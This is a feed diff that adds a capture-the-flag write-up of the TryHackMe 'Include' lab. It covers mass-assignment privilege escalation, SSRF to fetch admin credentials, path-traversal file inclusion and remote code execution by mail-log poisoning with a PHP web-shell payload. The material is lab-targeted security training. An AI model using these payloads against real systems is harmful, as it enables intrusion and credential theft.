@@ -2,9 +2,255 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <title>it on aviskase</title>
   <id>https://www.aviskase.com/</id>
-  <updated>2025-02-21T20:12:59Z</updated>
+  <updated>2025-03-05T16:35:52Z</updated>
   <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/categories/it/feeds/all.atom.xml" hreflang="en"/>
   <link rel="alternate" type="text/html" href="https://www.aviskase.com/categories/it/" hreflang="en"/>
+  <entry>
+    <title>Writeup: TryHackMe Include</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/" hreflang="en"/>
+    <published>2025-03-05T16:35:52Z</published>
+    <updated>2025-03-05T16:35:52Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-03-05:/articles/2025/03/05/writeup-tryhackme-include/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/room/include" class="external-link">Include</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks.</p>
+<p>Even if it&rsquo;s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?</p>
+<p>Answer the questions below</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/room/include" class="external-link">Include</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks.</p>
+<p>Even if it&rsquo;s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?</p>
+<p>Answer the questions below</p>
+<ol>
+<li>What is the flag value after logging in to the SysMon app?</li>
+<li>What is the content of the hidden text file in <code>/var/www/html</code>?</li>
+</ol>
+</div>
+<p>This room acts as a final challenge for the advanced server-side attacks module. Vulnerabilities explored:</p>
+<ul>
+<li>Broken object property level authorization (BOPLA)</li>
+<li>Information disclosure</li>
+<li>SSRF</li>
+<li>LFI2RCE via log poisoning</li>
+</ul>
+<div class="callout toc">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#privilege-escalation-via-mass-assignment-vulnerability">Privilege escalation via mass assignment vulnerability</a></li>
+    <li><a href="#getting-admin-credentials-via-ssrf">Getting admin credentials via SSRF</a></li>
+    <li><a href="#first-flag">First flag</a></li>
+    <li><a href="#lfi2rce-via-log-poisoning">LFI2RCE via log poisoning</a></li>
+    <li><a href="#second-flag">Second flag</a></li>
+  </ol>
+</nav>
+</div>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>I started with a port scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sS -vv -T4 MACHINE_IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE  REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh      syn-ack ttl <span style="color:#fab387">61</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>25/tcp    open  smtp     syn-ack ttl <span style="color:#fab387">61</span> Postfix smtpd
+</span></span><span style="display:flex;"><span>110/tcp   open  pop3     syn-ack ttl <span style="color:#fab387">61</span> Dovecot pop3d
+</span></span><span style="display:flex;"><span>143/tcp   open  imap     syn-ack ttl <span style="color:#fab387">61</span> Dovecot imapd <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>993/tcp   open  ssl/imap syn-ack ttl <span style="color:#fab387">61</span> Dovecot imapd <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>995/tcp   open  ssl/pop3 syn-ack ttl <span style="color:#fab387">61</span> Dovecot pop3d
+</span></span><span style="display:flex;"><span>4000/tcp  open  http     syn-ack ttl <span style="color:#fab387">61</span> Node.js <span style="color:#89dceb;font-weight:bold">(</span>Express middleware<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>50000/tcp open  http     syn-ack ttl <span style="color:#fab387">61</span> Apache httpd 2.4.41 <span style="color:#89dceb;font-weight:bold">((</span>Ubuntu<span style="color:#89dceb;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>There are lots of open ports: SSH, two web apps, and a mail server.</p>
+<p>The first web app running on port 5000 is a SysMon portal. We need to find a way into it to get the first flag.</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home_hu_7ecbce0bb8a16746.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home.png" alt="Screenshot of SysMon app" defer>
+	</picture>
+	
+</figure></p>
+<p>The second web app is running on port 4000.</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login_hu_e42cf2110645c7b5.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login.png" alt="Screenshot of review web app login page" defer>
+	</picture>
+	
+</figure></p>
+<p>Here, I almost missed the big &ldquo;Sign In using guest/guest&rdquo; phrase.</p>
+<h2 id="privilege-escalation-via-mass-assignment-vulnerability" >
+  <a href="#privilege-escalation-via-mass-assignment-vulnerability">Privilege escalation via mass assignment vulnerability</a>
+</h2>
+<p>Logging in with guest credentials displays several profiles. Current user profile exposes a lot of properties which can be considered <a href="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" class="external-link">an excessive data exposure part of BOPLA</a> vulnerability. And there is a form which allows adding new properties.</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_hu_4e915b21c3af1aa6.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile.png" alt="Screenshot of user profile" defer>
+	</picture>
+	
+</figure></p>
+<p>The form is vulnerable to the BOPLA&rsquo;s mass assignment attack, so I used it to escalate current user privileges to the administrator by changing value of <code>isAdmin</code> property.</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form_hu_6b6aeed1be95a8f8.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form.png" alt="Screenshot of the form set to isAdmin and true values" defer>
+	</picture>
+	
+</figure></p>
+<div class="callout note">
+    <p>Some writeups call this prototype pollution vulnerability, which is incorrect: we don&rsquo;t modify object prototype here.</p>
+</div>
+<h2 id="getting-admin-credentials-via-ssrf" >
+  <a href="#getting-admin-credentials-via-ssrf">Getting admin credentials via SSRF</a>
+</h2>
+<p>After successful privilege escalation, the page has two new links: &ldquo;API&rdquo; and &ldquo;Settings&rdquo;.</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin_hu_d11050bef3205cc.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin.png" alt="Screenshot of the page with new links" defer>
+	</picture>
+	
+</figure></p>
+<p>On &ldquo;API&rdquo; page there is information about how to access internal APIs; one endpoint allows getting administrator credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>API Dashboard
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Below is a list of important APIs accessible to admins with sample requests and responses:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Internal API
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET http://127.0.0.1:5000/internal-api HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 127.0.0.1:5000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Response:
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    &#34;secretKey&#34;: &#34;superSecretKey123&#34;,
+</span></span><span style="display:flex;"><span>    &#34;confidentialInfo&#34;: &#34;This is very confidential.&#34;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Get Admins API
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 127.0.0.1:5000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Response:
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    &#34;ReviewAppUsername&#34;: &#34;admin&#34;,
+</span></span><span style="display:flex;"><span>    &#34;ReviewAppPassword&#34;: &#34;xxxxxx&#34;,
+</span></span><span style="display:flex;"><span>    &#34;SysMonAppUsername&#34;: &#34;administrator&#34;,
+</span></span><span style="display:flex;"><span>    &#34;SysMonAppPassword&#34;: &#34;xxxxxxxxx&#34;,
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>&ldquo;Settings&rdquo; page allows changing banner image by providing URL.</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings_hu_6407b337f74ec0d7.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings.png" alt="Screeenshot of Admin Settings page" defer>
+	</picture>
+	
+</figure></p>
+<p>This page is vulnerable to SSRF attack. Instead of image URL I provided credentials endpoint:</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_banner_ssrf_hu_f934859fcb0b1717.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_banner_ssrf.png" alt="Screenshot of form set to credentials API url" defer>
+	</picture>
+	
+</figure></p>
+<p>The page includes the response in base64 encoded format:</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response_hu_532fb32eb84fa139.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response.png" alt="Screenshot of the page displaying result of SSRF" defer>
+	</picture>
+	
+</figure></p>
+<p>I used CyberChef to decode it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0= 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{&#34;ReviewAppUsername&#34;:&#34;admin&#34;,&#34;ReviewAppPassword&#34;:&#34;REDACTED&#34;,&#34;SysMonAppUsername&#34;:&#34;administrator&#34;,&#34;SysMonAppPassword&#34;:&#34;REDACTED&#34;}
+</span></span></code></pre></div><h2 id="first-flag" >
+  <a href="#first-flag">First flag</a>
+</h2>
+<p>With these credentials I logged into SysMon app and got the first flag.</p>
+<p>
+<figure>
+  <picture>
+    
+    
+    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard_hu_b25f2afaaf89a65c.webp" type="image/webp">
+    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard.png" alt="Screenshot of the dashboard with displayed flag" defer>
+	</picture>
+	
+</figure></p>
+<h2 id="lfi2rce-via-log-poisoning" >
+  <a href="#lfi2rce-via-log-poisoning">LFI2RCE via log poisoning</a>
+</h2>
+<p>Profile picture on the dashboard has a curious <code>src</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#cba6f7">img</span> <span style="color:#89b4fa">src</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#a6e3a1">&#34;profile.php?img=profile.png&#34;</span> <span style="color:#89b4fa">class</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#a6e3a1">&#34;img-fluid rounded-circle mb-3 profile-pic&#34;</span> <span style="color:#89b4fa">alt</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#a6e3a1">&#34;User Profile Picture&#34;</span>&gt;
+</span></span></code></pre></div><p>To check whether it is vulnerable to local file inclusion I used <code>ffuf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ ffuf -r -c -request req -request-proto &#39;http&#39; -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 100ms]
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42, Duration: 100ms]
+</span></span></code></pre></div><p>Since the second flag is found on the file system, I guessed I needed to achieve LFI2RCE. Initially, I unsuccessfully attempted Apache log poisoning.</p>
+<p>Remembering that there was a mail server, I tried <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/LFI-to-RCE/#rce-via-mail" class="external-link">mail log poisoning</a>. First, I confirmed that the file <code>/var/log/mail.log</code> can be accessed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>http:<span style="color:#89dceb;font-weight:bold">//</span>MACHINE_IP:<span style="color:#fab387">50000</span><span style="color:#89dceb;font-weight:bold">/</span>profile<span style="color:#89dceb;font-weight:bold">.</span>php<span style="color:#f38ba8">?</span>img<span style="color:#89dceb;font-weight:bold">=....//....//....//....//....//....//....//....//....//</span><span style="color:#cba6f7">var</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#89dceb">log</span><span style="color:#89dceb;font-weight:bold">/</span>mail<span style="color:#89dceb;font-weight:bold">.</span>log
+</span></span></code></pre></div><p>Next, to poison the log, I sent PHP code payload as an address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ telnet MACHINE_IP 25
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>220 mail.filepath.lab ESMTP Postfix (Ubuntu)
+</span></span><span style="display:flex;"><span>helo ok
+</span></span><span style="display:flex;"><span>250 mail.filepath.lab
+</span></span><span style="display:flex;"><span>mail from: &lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;
+</span></span><span style="display:flex;"><span>501 5.1.7 Bad sender address syntax
+</span></span><span style="display:flex;"><span>quit
+</span></span><span style="display:flex;"><span>221 2.0.0 Bye
+</span></span><span style="display:flex;"><span>Connection closed by foreign host.
+</span></span></code></pre></div><p>Now we can use <code>cmd</code> parameter to run commands on the system.</p>
+<h2 id="second-flag" >
+  <a href="#second-flag">Second flag</a>
+</h2>
+<p>While it&rsquo;s possible to <a href="https://jaxafed.github.io/posts/tryhackme_include/#log-poisoning-to-rce" class="external-link">start a reverse shell and get access to the entire system</a>, I simply listed files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>http:<span style="color:#89dceb;font-weight:bold">//</span>MACHINE_IP:<span style="color:#fab387">50000</span><span style="color:#89dceb;font-weight:bold">/</span>profile<span style="color:#89dceb;font-weight:bold">.</span>php<span style="color:#f38ba8">?</span>img<span style="color:#89dceb;font-weight:bold">=....//....//....//....//....//....//....//....//....//</span><span style="color:#cba6f7">var</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#89dceb">log</span><span style="color:#89dceb;font-weight:bold">/</span>mail<span style="color:#89dceb;font-weight:bold">.</span>log<span style="color:#89dceb;font-weight:bold">&amp;</span>cmd<span style="color:#89dceb;font-weight:bold">=</span>ls 
+</span></span></code></pre></div><p>And then used LFI again to get the content of the flag file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>http:<span style="color:#89dceb;font-weight:bold">//</span>MACHINE_IP:<span style="color:#fab387">50000</span><span style="color:#89dceb;font-weight:bold">/</span>profile<span style="color:#89dceb;font-weight:bold">.</span>php<span style="color:#f38ba8">?</span>img<span style="color:#89dceb;font-weight:bold">=....//....//....//....//....//....//....//....//....//</span><span style="color:#cba6f7">var</span><span style="color:#89dceb;font-weight:bold">/</span>www<span style="color:#89dceb;font-weight:bold">/</span>html<span style="color:#89dceb;font-weight:bold">/</span>REDACTED<span style="color:#89dceb;font-weight:bold">.</span>txt 
+</span></span></code></pre></div>]]></content>
+  </entry>
   <entry>
     <title>Writeup: TryHackMe Smol</title>
     <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/21/writeup-tryhackme-smol/" hreflang="en"/>
